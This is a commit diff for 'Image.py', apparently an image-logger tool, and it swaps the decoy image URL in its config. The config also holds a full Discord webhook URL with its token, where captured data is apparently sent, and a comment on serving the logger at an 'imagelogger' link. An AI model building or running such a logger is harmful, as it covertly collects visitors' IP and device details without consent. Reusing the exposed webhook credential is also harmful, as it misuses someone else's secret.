b7c7727a6b24c24dbd2d03aff2a1f473affafdf4
natiw1fsdaf <natialpershtein1@gmail.com>
2025-04-09 20:41:53 +0300

    Update Image.py

--- Image.py
+++ Image.py
@@ -13,7 +13,7 @@ __author__ = "Dexty"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1359571133849927920/FiuzBaC4W3HBpzPUKyPb14LEzkaLNusBIuBRJzCsYENzKX3ztjrTBTG2SVvuWy_k3z2O",
-    "image": "https://th.bing.com/th/id/R.4a10cc5456ddb0170e461fc60b002a98?rik=E49HgzWnOvklZw&riu=http%3a%2f%2fbeddingnewsnow.com%2fwp-content%2fuploads%2f2024%2f06%2fphotos.png&ehk=Ko4PmfmN7jF%2baqhjYS9ihVYeD80x8yXuvld9vSOUIo8%3d&risl=&pid=ImgRaw&r=0", # You can also have a custom image by using a URL argument
+    "image": "https://descriptive.audio/wp-content/uploads/2023/11/favorite-images.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
